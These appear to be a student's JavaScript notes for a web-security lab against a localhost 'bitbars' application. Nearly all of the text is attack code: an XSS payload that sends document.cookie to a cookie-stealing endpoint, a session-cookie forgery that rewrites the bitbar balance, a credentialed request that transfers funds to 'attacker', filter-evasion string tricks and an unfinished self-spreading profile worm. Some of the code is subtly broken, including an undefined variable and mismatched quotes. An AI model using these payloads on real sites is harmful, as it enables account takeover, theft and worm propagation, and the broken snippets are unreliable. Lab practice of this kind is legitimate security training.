

var xhr = new XMLHttpRequest(); // make new http request in javascript
xhr.open("POST", "http://localhost:3000/post_transfer"); // send request
xhr.send({PARAMETERS GO HERE});
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")
xhr.withCredentials = true;

''%2B ''
''\+''
''.concat('')

atob() --> converts ascii (base64) to binary
our cookies are stored in base64 ascii format

use JSON.parse() to parse json data format into a Javascript object (like a python dictionary)
substring(8) to isolate ascii cookie characters from "session="
stringify to convert back to string

http://localhost:3000/profile?username=<p hidden><script>var xhr = new XMLHttpRequest();var url = 'http://localhost:3000/steal_cookie?cookie='%2B document.cookie; xhr.open("GET", url); xhr.send();</script>


var sessObj = JSON.parse(atob(document.cookie.substring(8)));
sessObj.account.bitbars = 10;
document.cookie = "session=" + btoa(JSON.stringify(sessObj));

var args1 = "destination_username=attacker&quantity=1";
var xhr1 = new XMLHttpRequest();
xhr1.withCredentials = true;
xhr1.onload = function() {  // define iterative worm behaviour
    var profile = encodeURIComponent(document.getElementById("profile").innerHTML);
	var args2 = "new_profile=".concat(prof);
	var xhr2 = new XMLHttpRequest();
	xhr2.withCredentials=true;
	xhr2.onload=function(){
        // something goes here
        // ...
	}
	xhr2.open("post", "http://localhost:3000/set_profile");
	xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr2.send(args2);
}
xhr1.open("POST", "http://localhost:3000/set_profile");
xhr1.setRequestHeader('Content-Type", "application/x-www-form-urlencoded");
xhr1.send(args1);